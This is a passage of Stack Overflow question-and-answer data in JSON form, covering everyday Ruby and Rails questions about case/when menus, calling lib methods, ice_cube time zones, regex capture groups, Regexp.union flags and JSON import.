"display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "edited": false, "score": 0, "creation_date": 1511961752, "post_id": 47524638, "comment_id": 82064302, "body": "Thank you!  This was really helpful!  I implemented a version of your code like in the below:                                                                                                               case input.to_i             when 1..(choices.count - 1 )             buy_item_index(input.to_i)             buy_menu()         end         case input             when &quot;b&quot;,&quot;B&quot;             main_menu         else             puts &quot;Not a valid input&quot; #unless input.to_i &lt;= choices.count             buy_menu         end"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", "display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "edited": false, "score": 0, "creation_date": 1511962567, "post_id": 47524638, "comment_id": 82064830, "body": "Why for God\u2019s sake do you need 2 <code>case</code>s?! This is a code smell."}, {"owner": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", "display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "edited": false, "score": 0, "creation_date": 1511970078, "post_id": 47524638, "comment_id": 82070372, "body": "For some reason, when I change your code from case input.to_i  to case input   it can&#39;t register any of the numbers ex. 1,2,34, etc.  It registers them as an invalid input.  WIth two cases, it ends up working.  I would prefer to have one case, but can&#39;t get it to work otherwise"}, {"owner": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", "display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "edited": false, "score": 0, "creation_date": 1511979712, "post_id": 47524638, "comment_id": 82076299, "body": "Thank you!  That&#39;s works great!  One small note that for this particular case it needs to be (1..choices.count - 1)  because Go [B]ack is also a choice and so it causes an error if you type in the first number after the numbered list"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", "display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "edited": false, "score": 0, "creation_date": 1511980416, "post_id": 47524638, "comment_id": 82076652, "body": "<code>choices.count-1</code> :: fixed."}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 1, "last_activity_date": 1511980396, "last_edit_date": 1511980396, "creation_date": 1511847304, "answer_id": 47524638, "question_id": 47523756, "link": "https://stackoverflow.com/questions/47523756/dynamic-case-when-conditions/47524638#47524638", "title": "Dynamic &#39;case&#39; &#39;when&#39; conditions", "body": "<pre><code>case input.to_i\nwhen 1..choices.count-1\n  buy_item_index(input.to_i)\nelse\n  puts \"Not a valid input\" unless input.downcase == 'b'\nend\nbuy_menu\n</code></pre>\n\n<p>or:</p>\n\n<pre><code>if (1..choices.count-1).cover? input.to_i\n  buy_item_index(input.to_i)\nelsif input.downcase != 'b'\n  puts \"Not a valid input\"\nend\nbuy_menu\n</code></pre>\n\n<hr>\n\n<p><em>Update:</em> one case for all:</p>\n\n<pre><code>case input\nwhen 'b', 'B'\n  main_menu\nwhen -&gt;(i) { (1..choices.count-1).cover? i.to_i }\n  buy_item_index(input.to_i)\n  buy_menu\nelse\n  puts \"Not a valid input\"\n  buy_menu\nend\n</code></pre>\n"}], "owner": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", "display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 231, "favorite_count": 0, "accepted_answer_id": 47524638, "answer_count": 3, "score": 0, "last_activity_date": 1511980396, "creation_date": 1511841512, "last_edit_date": 1511843129, "question_id": 47523756, "link": "https://stackoverflow.com/questions/47523756/dynamic-case-when-conditions", "title": "Dynamic &#39;case&#39; &#39;when&#39; conditions", "body": "<p>The following function iterates over an array <code>MASTER_INVENTORY</code>, and presents choices to buy. Typing <code>1</code> buys <code>Item #1</code>, Typing <code>2</code> buys <code>Item #2</code>, Typing <code>34</code> buys <code>Item #34</code>.</p>\n\n<pre><code>def buy_menu()\n  choices = ['Go [B]ack']\n  i = 1\n  MASTER_INVENTORY.each do |obj| \n    choices &lt;&lt; \"[#{i}] Buy #{obj.name} Price: #{obj.price}\"\n    i += 1\n  end\n  choicemap = choices.map { |c| \"  #{c}\\n\" }.join\n  puts choicemap\n  input = gets.chomp\n  case input\n  when \"b\",\"B\"\n    main_menu\n  when \"1\"\n    buy_item_index(1)\n    buy_menu\n  when \"2\"\n    buy_item_index(2)\n    buy_menu            \n  when ...\n    ...\n  else\n    puts \"Not a valid input\"\n    buy_menu\n  end        \nend\n</code></pre>\n\n<p>How can I dynamically increment <code>case</code> <code>when</code> options instead of hard-coding them like I did above?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 2, "creation_date": 1511839788, "post_id": 47523503, "comment_id": 82003216, "body": "How&#39;s calculateDistance being defined?"}, {"owner": {"reputation": 382, "user_id": 3308003, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/AiKlE.png?s=128&g=1", "display_name": "rony", "link": "https://stackoverflow.com/users/3308003/rony"}, "reply_to_user": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1511841507, "post_id": 47523503, "comment_id": 82003696, "body": "exactly as written, def calculateDistance(lat, lng), and I read something about passing the argument as params, I&#39;ve tried also. But it failed somehow."}, {"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1511841609, "post_id": 47523503, "comment_id": 82003722, "body": "What&#39;s the context, does the method belong to any particular class? to DistanceCalculation? if you have more code related to the problem, you could improve your question."}, {"owner": {"reputation": 382, "user_id": 3308003, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/AiKlE.png?s=128&g=1", "display_name": "rony", "link": "https://stackoverflow.com/users/3308003/rony"}, "reply_to_user": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1511841831, "post_id": 47523503, "comment_id": 82003773, "body": "Yes, it belongs to class DistanceCalculation and inside it, has a methods of calculateDistance"}, {"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 0, "creation_date": 1511852306, "post_id": 47523503, "comment_id": 82007244, "body": "are you sure it&#39;s not an instance method, e.g. DistanceCalculation.new.calculateDistance?"}, {"owner": {"reputation": 382, "user_id": 3308003, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/AiKlE.png?s=128&g=1", "display_name": "rony", "link": "https://stackoverflow.com/users/3308003/rony"}, "edited": false, "score": 0, "creation_date": 1511856837, "post_id": 47523503, "comment_id": 82009499, "body": "I have no Idea, because I never use the word <code>new</code> in Swift language. Do we have to?"}], "answers": [{"tags": [], "owner": {"reputation": 1515, "user_id": 7189767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c979c9b4f88620e8ddbf74fb6a83824?s=128&d=identicon&r=PG&f=1", "display_name": "Fallenhero", "link": "https://stackoverflow.com/users/7189767/fallenhero"}, "is_accepted": false, "score": 0, "last_activity_date": 1511858012, "creation_date": 1511858012, "answer_id": 47527108, "question_id": 47523503, "link": "https://stackoverflow.com/questions/47523503/passing-arguments-from-controller-to-a-method-in-app-lib/47527108#47527108", "title": "Passing arguments from controller to a method in &#39;app/lib&#39;", "body": "<p>You need to do either:</p>\n\n<p>Define the method as a class method:</p>\n\n<p>app/lib:</p>\n\n<pre><code>def self.calculateDistance(lat,lng)\n</code></pre>\n\n<p>Or call it as an instance method:</p>\n\n<pre><code>DistanceCalculation.new.calculateDistance(lat,lng)\n</code></pre>\n"}], "owner": {"reputation": 382, "user_id": 3308003, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/AiKlE.png?s=128&g=1", "display_name": "rony", "link": "https://stackoverflow.com/users/3308003/rony"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 32, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1511858012, "creation_date": 1511839630, "last_edit_date": 1511840427, "question_id": 47523503, "link": "https://stackoverflow.com/questions/47523503/passing-arguments-from-controller-to-a-method-in-app-lib", "title": "Passing arguments from controller to a method in &#39;app/lib&#39;", "body": "<p>I'm using Rails without model and database. I have a controller that uses methods in <code>app/lib</code>:</p>\n\n<pre><code>def calculateDistance(lat,lng)\n  ...\n</code></pre>\n\n<p>The method will return data in JSON format, and will be passed to the view.</p>\n\n<p>I tried doing:</p>\n\n<pre><code>lat = params[10.0000]\nlng = params[101.0000]\nDistanceCalculation.calculateDistance(lat,lng)\n</code></pre>\n\n<p>I get an error:</p>\n\n<p><a href=\"https://i.stack.imgur.com/PZd0i.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/PZd0i.png\" alt=\"error\"></a></p>\n\n<p>What did I do wrong? </p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ice-cube"], "comments": [{"owner": {"reputation": 361, "user_id": 6665764, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Wh8CZ.jpg?s=128&g=1", "display_name": "inveterateliterate", "link": "https://stackoverflow.com/users/6665764/inveterateliterate"}, "edited": false, "score": 0, "creation_date": 1512131279, "post_id": 47523480, "comment_id": 82143838, "body": "What datatype are you using for the <code>start_time</code> and <code>end_time</code> fields? How are you converting to UTC / what is the full object you get when you convert a time like 11 pm EST?"}], "answers": [{"tags": [], "owner": {"reputation": 361, "user_id": 6665764, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Wh8CZ.jpg?s=128&g=1", "display_name": "inveterateliterate", "link": "https://stackoverflow.com/users/6665764/inveterateliterate"}, "is_accepted": false, "score": 1, "last_activity_date": 1511843620, "creation_date": 1511843620, "answer_id": 47524083, "question_id": 47523480, "link": "https://stackoverflow.com/questions/47523480/event-recurrence-with-time-zones-using-the-ice-cube-gem/47524083#47524083", "title": "Event Recurrence with Time Zones using the Ice Cube gem", "body": "<p>TL/DR; Yes, since your rule says M, W, F you will get false when you pass in Tuesday.</p>\n\n<p>More info:</p>\n\n<p>From the documentation, \"A schedule's occurrences will be returned in the same class and time zone as the schedule's start_time.\" If you pass UTC, it will return in UTC (or whatever timezone you choose).</p>\n\n<p>Timezones are a pain, but there are several Rails helpers to get you on the right track (<a href=\"http://api.rubyonrails.org/classes/ActiveSupport/TimeZone.html\" rel=\"nofollow noreferrer\">http://api.rubyonrails.org/classes/ActiveSupport/TimeZone.html</a>). Your instinct to save everything to the db in UTC is a good one. The trick then is keeping track of the days. Essentially you need to have a way to have a display for the user that makes sense in their timezone, then translate it the db in UTC, and pass it to your rule appropriately.</p>\n\n<p>Take a look at this helper, which allows you to convert between timezones, and even pass in a date argument to refine which date you want the actual time attached to: <a href=\"https://github.com/LaunchPadLab/rails_util/blob/master/lib/rails_util/timezone_helper.rb\" rel=\"nofollow noreferrer\">https://github.com/LaunchPadLab/rails_util/blob/master/lib/rails_util/timezone_helper.rb</a></p>\n\n<p>Not trying to promote, you don't have to use that library, but it might be worth taking a look at the logic we came up with, and see if you can apply that thinking to your app.</p>\n"}], "owner": {"reputation": 9149, "user_id": 214812, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/03fb59bf27824bdd9e12b461b5f1c117?s=128&d=identicon&r=PG", "display_name": "ardavis", "link": "https://stackoverflow.com/users/214812/ardavis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 310, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1512009992, "creation_date": 1511839495, "last_edit_date": 1512009992, "question_id": 47523480, "link": "https://stackoverflow.com/questions/47523480/event-recurrence-with-time-zones-using-the-ice-cube-gem", "title": "Event Recurrence with Time Zones using the Ice Cube gem", "body": "<p>How do I utilize the <a href=\"https://github.com/seejohnrun/ice_cube\" rel=\"nofollow noreferrer\">ice_cube</a> gem for items (events) that have both a start and end time (Ex: Mon, Wed, Fri @ 10pm-11:30pm EST)?</p>\n\n<p>I currently store all times in the database in UTC. So for the example above, the item looks like this:</p>\n\n<pre><code>#&lt;Item recurring: {:validations=&gt;{:day=&gt;[1, 3, 5]}, :rule_type=&gt;\"IceCube::WeeklyRule\", :interval=&gt;1, :week_start=&gt;0}, start_time: \"2017-11-21 03:00:00\", end_time: \"2017-12-24 04:30:00\"\"&gt;\n</code></pre>\n\n<p>If I want to see if that item occurs on a date between two times, I''m attempting this:</p>\n\n<pre><code>item.schedule(item.start_time).occurs_between?(some_start_time, some_end_time)\n</code></pre>\n\n<p>This unfortunately returns <code>false</code> if I pass in <code>some_start_time</code> of <code>Tue, 28 Nov 2017 03:00:00 UTC +00:00</code> (Mon @ 10pm EST) and <code>some_end_time</code> of <code>Tue, 28 Nov 2017 04:30:00 UTC +00:00</code> (Mon @ 11:30 EST). I believe that's because the <code>ice_cube</code> gem will only show conflicts for Mon, Wed, Fri with the rules I've setup?</p>\n\n<p>I feel like I'm missing something fundamental about the gem. <strong>How do I account for time zones properly? I think the ultimate goal would be, if I let the user select Mon, Wed, Fri from 10pm to 11:30pm, I need it to store the recurrence as Tue, Thu, Sat from 3am to 4:30am.</strong></p>\n\n<p>Here's how I'm implementing my <code>Item</code> class in Rails.</p>\n\n<pre><code>class Item\n  serialize :recurring, Hash\n\n  def recurring=(value)\n    RecurringSelect.is_valid_rule?(value) ? super(RecurringSelect.dirty_hash_to_rule(value).to_hash) : super(nil)\n  end\n\n  def rule\n    IceCube::Rule.from_hash(recurring)\n  end\n\n  def schedule(start)\n    schedule = IceCube::Schedule.new(start)\n    schedule.add_recurrence_rule(rule)\n    schedule\n  end\nend\n</code></pre>\n\n<p><strong>Update</strong></p>\n\n<p>I am also using the <a href=\"https://github.com/GetJobber/recurring_select\" rel=\"nofollow noreferrer\">recurrence_select</a> gem. This is what let's the user easily choose \"Weekly on Monday, Wednesday, and Friday\". I separately let the user select the <code>start_time</code> and <code>end_time</code> for the item. I'm correctly converting the times to UTC from their time zone when I save to the database. I somehow need to know if the days roll over as well and modify them before it saves.</p>\n"}, {"tags": ["ruby", "regex", "pattern-matching"], "comments": [{"owner": {"reputation": 9030, "user_id": 5101476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JCQrl.jpg?s=128&g=1", "display_name": "ice\u30c4", "link": "https://stackoverflow.com/users/5101476/ice%e3%83%84"}, "edited": false, "score": 1, "creation_date": 1511839541, "post_id": 47523257, "comment_id": 82003148, "body": "The terms <i>match</i> and <i>capture</i> have different meanings in regex, so be careful how you use them. Also <code>\\A</code> is not a character. <code>&#47;-|\\A.&#47;</code> would match a hyphen or the starting character. i.e. <code>&#39;new-york&#39;.scan(&#47;-|\\A.&#47;) #=&gt; [&quot;n&quot;, &quot;-&quot;] </code>"}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "reply_to_user": {"reputation": 9030, "user_id": 5101476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JCQrl.jpg?s=128&g=1", "display_name": "ice\u30c4", "link": "https://stackoverflow.com/users/5101476/ice%e3%83%84"}, "edited": false, "score": 0, "creation_date": 1512114366, "post_id": 47523257, "comment_id": 82134667, "body": "@SagarPandya The OP has <code>&#47;(-|\\A).&#47;</code>, not <code>&#47;-|\\A.&#47;</code>."}, {"owner": {"reputation": 9030, "user_id": 5101476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JCQrl.jpg?s=128&g=1", "display_name": "ice\u30c4", "link": "https://stackoverflow.com/users/5101476/ice%e3%83%84"}, "reply_to_user": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1512116918, "post_id": 47523257, "comment_id": 82135815, "body": "@sawa I wrote my regex to show how to match either any <code>-</code> characters or the first character since that&#39;s what the OP erroneously thought his regex did: &quot;The captured group m is either a hyphen or the starting character...etc&quot;."}], "answers": [{"comments": [{"owner": {"reputation": 5850, "user_id": 4501354, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/1230cfcc7f68488ad19d0022cf7b1a93?s=128&d=identicon&r=PG&f=1", "display_name": "Donato", "link": "https://stackoverflow.com/users/4501354/donato"}, "edited": false, "score": 0, "creation_date": 1511844155, "post_id": 47523718, "comment_id": 82004387, "body": "Let me ask this another way. Why doesn&#39;t this return a y: &#39;new-york&#39;.scan(/-|\\A./) #=&gt; [&quot;n&quot;, &quot;-&quot;]  =&gt; [&quot;n&quot;, &quot;-&quot;]"}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "reply_to_user": {"reputation": 5850, "user_id": 4501354, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/1230cfcc7f68488ad19d0022cf7b1a93?s=128&d=identicon&r=PG&f=1", "display_name": "Donato", "link": "https://stackoverflow.com/users/4501354/donato"}, "edited": false, "score": 1, "creation_date": 1511844503, "post_id": 47523718, "comment_id": 82004496, "body": "Because the <code>-</code> option in your regex only matches <code>&quot;-&quot;</code>."}, {"owner": {"reputation": 5850, "user_id": 4501354, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/1230cfcc7f68488ad19d0022cf7b1a93?s=128&d=identicon&r=PG&f=1", "display_name": "Donato", "link": "https://stackoverflow.com/users/4501354/donato"}, "edited": false, "score": 0, "creation_date": 1512612406, "post_id": 47523718, "comment_id": 82332503, "body": "It makes sense now. \\A refers to the position before the first character. And since the regex uses both \\A and the . character (Any character except line break), it matches the &quot;&quot; (position before first character) and &quot;n&quot; (the next character). This is returned as &quot;n&quot;. The same logic is used to get &quot;-y&quot;."}], "tags": [], "owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "is_accepted": true, "score": 5, "last_activity_date": 1511841260, "creation_date": 1511841260, "answer_id": 47523718, "question_id": 47523257, "link": "https://stackoverflow.com/questions/47523257/captured-group-in-regular-expression-is-more-than-matched-string/47523718#47523718", "title": "Captured group in regular expression is more than matched string?", "body": "<p>The (first) captured group is what corresponds to your (first) pair of parentheses in the regex <code>(-|\\A)</code>, which is either <code>\"\"</code> or <code>\"-\"</code>. This is the <code>$1</code>. Notice that <code>\\A</code> is a position, not a character; it is not <code>\"n\"</code>, but is the empty string <code>\"\"</code> right before the <code>\"n\"</code>.</p>\n\n<p>The match is what corresponds to your whole regex <code>(-|\\A).</code>, which is either <code>\"n\"</code> or <code>\"-y\"</code>. This is the <code>m</code>.</p>\n"}], "owner": {"reputation": 5850, "user_id": 4501354, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/1230cfcc7f68488ad19d0022cf7b1a93?s=128&d=identicon&r=PG&f=1", "display_name": "Donato", "link": "https://stackoverflow.com/users/4501354/donato"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 109, "favorite_count": 0, "accepted_answer_id": 47523718, "answer_count": 1, "score": 1, "last_activity_date": 1511841260, "creation_date": 1511838031, "last_edit_date": 1511840807, "question_id": 47523257, "link": "https://stackoverflow.com/questions/47523257/captured-group-in-regular-expression-is-more-than-matched-string", "title": "Captured group in regular expression is more than matched string?", "body": "<p>I reviewed the documentation for <code>gsub</code>:</p>\n\n<blockquote>\n  <p>Returns a copy of str with the all occurrences of pattern substituted\n  for the second argument.</p>\n  \n  <p>In the block form, the current match string is passed in as a\n  parameter, and variables such as $1, $2, $`, $&amp;, and $' will be set\n  appropriately. The value returned by the block will be substituted for\n  the match on each call.</p>\n</blockquote>\n\n<p>I have this example:</p>\n\n<pre><code>\"new-york\".gsub(/(-|\\A)./) do |m|\n  m #=&gt; \"n\", \"-y\"\n  m[-1].upcase\nend\n #=&gt; \"NewYork\" \n</code></pre>\n\n<p>The captured group <code>m</code> is either a hyphen or the starting character. The starting character is <code>\"n\"</code>. The only other captured item should be the hyphen <code>\"-\"</code>. The output captured <code>\"-y\"</code> rather than just <code>\"-\"</code>. <code>\"y\"</code> is neither a hyphen or start character. Why was it captured?</p>\n"}, {"tags": ["ruby", "regex", "code-inspection"], "answers": [{"tags": [], "owner": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "is_accepted": false, "score": 1, "last_activity_date": 1511837845, "last_edit_date": 1511837845, "creation_date": 1511834078, "answer_id": 47522716, "question_id": 47522663, "link": "https://stackoverflow.com/questions/47522663/inspection-of-regexp-union/47522716#47522716", "title": "Inspection of &#39;Regexp.union&#39;", "body": "<p>They are flag switches inside the regexp. <code>/cats/i</code> means \"use flag <code>i</code> across the whole regexp\". You can turn flags on and off inside a regexp, so the above is equivalent to <code>/(?i:cats)/</code>. There are two other flags that can be manipulated this way: <code>m</code> and <code>x</code>. Since by default all flags are disabled unless specified otherwise, it is equivalent to <code>/(?i-mx:cats)/</code> (\"enable <code>i</code> and disable <code>m</code> and <code>x</code> inside the regular expression <code>cats</code>\").</p>\n\n<p>When you combine regular expressions, they explicitly disable the disabled flags so that they would not inherit them from an outer context. For example:</p>\n\n<pre><code>tiny = /tiny/             # case sensitive\ntina = /#{tiny} tina/i    # case insensitive\n# =&gt; /(?-mix:tiny) tina/i\n</code></pre>\n\n<p>This will match <code>\"tiny tina\"</code> or <code>\"tiny Tina\"</code>, but not <code>\"Tiny Tina\"</code>. If the embedded regexp for <code>tiny</code> did not explicitly turn off case sensitivity, and just yielded <code>/tiny tina/i</code>, everything would be case insensitive.</p>\n"}, {"tags": [], "owner": {"reputation": 16527, "user_id": 3124288, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/6fa5b34aa1b0d8508347f48a8d596399?s=128&d=identicon&r=PG&f=1", "display_name": "JKillian", "link": "https://stackoverflow.com/users/3124288/jkillian"}, "is_accepted": true, "score": 1, "last_activity_date": 1511837619, "last_edit_date": 1511837619, "creation_date": 1511834112, "answer_id": 47522722, "question_id": 47522663, "link": "https://stackoverflow.com/questions/47522663/inspection-of-regexp-union/47522722#47522722", "title": "Inspection of &#39;Regexp.union&#39;", "body": "<p>What you're seeing is a representation of options on sub-regexes. The options to the left of the hyphen are <em>on</em>, and the options to the right of the hyphen are <em>off</em>. It's smart to explicitly set each option as on or off to ensure the right behavior if this regex ever became part of a larger one.</p>\n\n<p>In your example, <code>(?-mix:dogs)</code> means that the <code>m</code>, <code>i</code>, and <code>x</code> options are all off whereas in <code>(?i-mx:cats)</code>, the <code>i</code> option is on and thus that subexpression is case-insensitive.</p>\n\n<p>See the Ruby docs on <a href=\"https://ruby-doc.org/core-2.4.2/Regexp.html#class-Regexp-label-Options\" rel=\"nofollow noreferrer\">Regexp Options</a>:</p>\n\n<blockquote>\n  <p>The end delimiter for a regexp can be followed by one or more single-letter options which control how the pattern can match.</p>\n  \n  <ul>\n  <li><code>/pat/i</code> - Ignore case</li>\n  <li><code>/pat/m</code> - Treat a newline as a character matched by .</li>\n  <li><code>/pat/x</code> - Ignore whitespace and comments in the pattern</li>\n  <li><code>/pat/o</code> - Perform #{} interpolation only once</li>\n  </ul>\n  \n  <p>i, m, and x can also be applied on the subexpression level with the <code>(?on-off)</code> construct, which enables options <em>on</em>, and disables options <em>off</em> for the expression enclosed by the parentheses.</p>\n</blockquote>\n"}], "owner": {"reputation": 5850, "user_id": 4501354, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/1230cfcc7f68488ad19d0022cf7b1a93?s=128&d=identicon&r=PG&f=1", "display_name": "Donato", "link": "https://stackoverflow.com/users/4501354/donato"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "closed_date": 1511854561, "accepted_answer_id": 47522722, "answer_count": 2, "score": 0, "last_activity_date": 1511837845, "creation_date": 1511833684, "last_edit_date": 1511837361, "question_id": 47522663, "link": "https://stackoverflow.com/questions/47522663/inspection-of-regexp-union", "closed_reason": "Duplicate", "title": "Inspection of &#39;Regexp.union&#39;", "body": "<p><code>Regexp.union</code> returns the following inspection:</p>\n\n<pre><code>Regexp.union(/dogs/, /cats/i) #=&gt; /(?-mix:dogs)|(?i-mx:cats)/\n</code></pre>\n\n<p>What does <code>?-mix:</code> mean?</p>\n"}, {"tags": ["arrays", "json", "ruby"], "comments": [{"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511861381, "post_id": 47522400, "comment_id": 82012342, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/47521477/ruby-class-methods-and-iteration\">Ruby class methods and iteration</a>"}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511861515, "post_id": 47522400, "comment_id": 82012431, "body": "Your third account for asking the same question again? You even forgot to change &quot;Car&quot; to &quot;Phone&quot; in your last two array elements."}], "answers": [{"tags": [], "owner": {"reputation": 7565, "user_id": 1021515, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/Z9QcP.jpg?s=128&g=1", "display_name": "mwp", "link": "https://stackoverflow.com/users/1021515/mwp"}, "is_accepted": false, "score": 0, "last_activity_date": 1511833263, "creation_date": 1511833263, "answer_id": 47522613, "question_id": 47522400, "link": "https://stackoverflow.com/questions/47522400/ruby-import-json-data/47522613#47522613", "title": "ruby import json data", "body": "<p>The <code>data.rb</code> file is set up to be used by RSpec. Even in that context, it's a little awkward. I would move the JSON data to JSON file and then you can access it from both places. There are other options as well but I would need to know more about your application and how and where you're using this data. </p>\n\n<h3>data.json:</h3>\n\n<pre><code>[\n  {\n    \"Phone\": \"iPhone 6\",\n    \"Year\": \"2014\"\n  },\n  {\n    \"Phone\": \"iPhone 7\",\n    \"Year\": \"2016\"\n  },\n  {\n    \"Car\": \"iPhone 8\",\n    \"Year\": \"2017\"\n  },\n  {\n    \"Car\": \"Galaxy S8\",\n    \"Year\": \"2017\"\n  }\n]\n</code></pre>\n\n<h3>data.rb:</h3>\n\n<pre><code>require 'json'\n\nlet(:phone_data) {\n  JSON.parse(File.read('data.json'))\n}\n</code></pre>\n\n<h3>main.rb:</h3>\n\n<pre><code>require 'json'\n\ndef count_years\n  